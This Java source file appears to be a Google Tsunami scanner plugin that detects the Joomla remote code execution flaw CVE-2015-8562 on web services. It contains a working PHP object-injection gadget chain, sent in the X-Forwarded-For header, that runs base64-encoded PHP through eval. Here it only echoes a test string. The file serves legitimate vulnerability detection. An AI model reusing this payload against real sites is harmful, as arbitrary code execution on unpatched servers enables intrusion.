/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.joomla.cve20158562;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpClient.TSUNAMI_USER_AGENT;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.base.Splitter;
import com.google.common.collect.ImmutableList;
import com.google.common.collect.Iterables;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.BaseEncoding;
import com.google.common.net.HostAndPort;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.time.Clock;
import java.time.Instant;
import java.util.Base64;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects CVE-2015-8562 on Joomla web applications. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "JoomlaCve20158562Detector",
    version = "0.1",
    description =
        "Tsunami detector for PHP object injection and arbitrary code execution via HTTP "
            + "headers in Joomla (CVE-2015-8562)",
    author = "Pietro Ferretti (pferretti@google.com)",
    bootstrapModule = JoomlaCve20158562DetectorBootstrapModule.class)
public final class JoomlaCve20158562Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final int TIMEOUT_SECONDS = 10;
  private static final byte[] INVALID_UTF8 = BaseEncoding.base16().decode("F0FDFDFD");
  private static final String TEST_STRING_HEAD = "iPki05WxaV";
  private static final String TEST_STRING_TAIL = "ganktmH3BK";
  static final String TEST_STRING = TEST_STRING_HEAD + TEST_STRING_TAIL;

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  JoomlaCve20158562Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Joomla! CVE-2015-8562.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    HostAndPort hostAndPort =
        NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());
    HttpResponse response;

    // Request 1: plain GET request to create a session and retrieve the session cookie.
    logger.atInfo().log("Creating a new Joomla session on target '%s'.", targetUri);
    try {
      response = httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
    // Parse the cookie values.
    ImmutableList<String> cookies = parseCookies(response);
    if (cookies.isEmpty()) {
      logger.atInfo().log("No Set-Cookie header in the HTTP response.");
      return false;
    }

    // Request 2: pass the PHP object injection payload in an HTTP header.
    logger.atInfo().log("Sending CVE-2015-8562 payload to target '%s'.", targetUri);
    // We use a concatenation of string as command to make sure that the PHP code is executed.
    String phpCommand = "echo('" + TEST_STRING_HEAD + "'.'" + TEST_STRING_TAIL + "');";
    String assertPayload = buildAssertPayload(phpCommand);
    byte[] httpRequest;
    try {
      byte[] phpObjectPayload = buildPhpObjectPayload(assertPayload);
      httpRequest = buildHttpRequestWithPayload(hostAndPort, cookies, phpObjectPayload);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to build payload for CVE-2015-8562.");
      return false;
    }
    // We need to open a socket because common HTTP clients do not support non-UTF8 bytes in the
    // request headers.
    Socket socket;
    try {
      socket = new Socket(hostAndPort.getHost(), hostAndPort.getPort());
      socket.setSoTimeout(TIMEOUT_SECONDS * 1000);
      OutputStream out = socket.getOutputStream();
      out.write(httpRequest);
      // Block until we receive a successful response.
      BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream(), UTF_8));
      String httpResponse = in.readLine();
      if (!httpResponse.contains("200 OK")) {
        logger.atInfo().log("Sending object injection payload failed");
        return false;
      }
      socket.close();
    } catch (UnknownHostException e) {
      logger.atWarning().withCause(e).log("Unable to connect via socket to '%s'", targetUri);
      return false;
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("IO error while connected via socket to '%s'", targetUri);
      return false;
    }

    // Request 3: trigger the payload with a GET request in the same session (i.e. same cookies).
    logger.atInfo().log("Triggering the payload for CVE-2015-8562 on target '%s'.", targetUri);
    HttpHeaders headers =
        HttpHeaders.builder().addHeader("Cookie", String.join("; ", cookies)).build();
    try {
      response = httpClient.send(get(targetUri).setHeaders(headers).build(), networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
    // Check if the concatenated string is echoed back.
    return response.bodyString().map(body -> body.contains(TEST_STRING)).orElse(false);
  }

  private static ImmutableList<String> parseCookies(HttpResponse response) {
    return response.headers().getAll("Set-Cookie").stream()
        .map(headerValue -> Iterables.get(Splitter.on(';').split(headerValue), 0))
        .collect(toImmutableList());
  }

  private static String buildAssertPayload(String phpCommand) {
    // This will be passed as argument to eval() and interpreted as PHP.
    // The 'http://' assignment is necessary to trigger the correct code path.
    // The additional eval + base64 is just convenient to pass arbitrary commands without having to
    // worry about escaping quotes.
    return "eval(base64_decode('"
        + Base64.getEncoder().encodeToString(phpCommand.getBytes(UTF_8))
        + "'))||$x='http://';";
  }

  private static byte[] buildPhpObjectPayload(String assertPayload) throws IOException {
    // This crafted PHP object chains two PHP gadgets available in Joomla (disconnectHandlers in
    // JDatabaseDriverMysqli and cache_name_function in SimplePie) to execute arbitrary PHP code.
    String payloadString =
        "}__fake|O:21:\"JDatabaseDriverMysqli\":3:{"
            + "s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}"
            + "s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{"
              + "i:0;a:2:{"
                + "i:0;O:9:\"SimplePie\":5:{"
                  + "s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}"
                  + "s:8:\"feed_url\";s:" + assertPayload.length() + ":\"" + assertPayload + "\";"
                  + "s:19:\"cache_name_function\";s:6:\"assert\";"
                  + "s:5:\"cache\";b:1;"
                  + "s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}"
                + "i:1;s:4:\"init\";}}"
            + "s:13:\"\\0\\0\\0connection\";b:1;}";
    ByteArrayOutputStream payloadByteArray = new ByteArrayOutputStream();
    payloadByteArray.write(payloadString.getBytes(UTF_8));
    // Adding this invalid UTF-8 codepoint will truncate the session entry in the database, removing
    // the right half of the original object that we are replacing.
    payloadByteArray.write(INVALID_UTF8);
    return payloadByteArray.toByteArray();
  }

  private static byte[] buildHttpRequestWithPayload(
      HostAndPort hostAndPort, ImmutableList<String> cookies,
      byte[] phpObjectPayload) throws IOException {
    // Both User-Agent and X-Forwarded-For are vulnerable to injection.
    // We use X-Forwarded-For since we're already using User-Agent for the Tsunami user agent.
    String httpRequestString =
        "GET / HTTP/1.1\r\n"
        + "Host: " + hostAndPort.getHost() + ":" + hostAndPort.getPort() + "\r\n"
        + "Connection: keep-alive\r\n"
        + "Accept-Encoding: gzip\r\n"
        + "Accept: */*\r\n"
        + "User-Agent: " + TSUNAMI_USER_AGENT + "\r\n"
        + "Cookie: " + String.join("; ", cookies) + "\r\n"
        + "X-Forwarded-For: ";
    ByteArrayOutputStream httpRequestByteArray = new ByteArrayOutputStream();
    httpRequestByteArray.write(httpRequestString.getBytes(UTF_8));
    httpRequestByteArray.write(phpObjectPayload);
    httpRequestByteArray.write("\r\n\r\n".getBytes(UTF_8));
    return httpRequestByteArray.toByteArray();
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2015_8562"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Joomla RCE via PHP object injection in HTTP headers (CVE-2015-8562)")
                .setDescription(
                    "The Joomla application is vulnerable to CVE-2015-8562, which allow remote"
                        + " attackers to conduct PHP object injection attacks and execute"
                        + " arbitrary PHP code via the HTTP User-Agent header.")
                .setRecommendation("Upgrade to Joomla 3.4.6 or greater."))
        .build();
  }
}
